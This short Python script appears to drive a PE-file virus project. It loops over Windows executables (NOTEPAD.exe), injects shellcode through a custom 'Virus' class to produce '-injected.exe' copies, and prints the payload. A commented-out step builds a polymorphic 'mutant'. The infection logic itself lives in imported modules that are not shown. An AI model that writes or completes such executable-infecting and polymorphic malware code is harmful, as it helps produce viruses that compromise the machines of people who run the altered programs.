import pefile
import os
import Polymorphic
import pe_file
import encrypted_virus

if __name__ == '__main__':
    file = [ 
        'NOTEPAD.exe',
        # 'calc.exe'
    ]
    
    # Infect and create virus to PE file
    for input_file in file:
        output_file = input_file.replace('.exe', '-injected.exe')
        print("\n---------------------Injecting ", input_file, "-----------------------------")
        print("\n")
        
        virus = pe_file.Virus(file)
        virus.injected_shell_code(input_file, output_file)
        payload = virus.get_payload()
        print(payload)

    # Create mutant
    #virus = Polymorphic.SimplePoly(f"./src_asm/header.asm")
    # virus.polymorphic()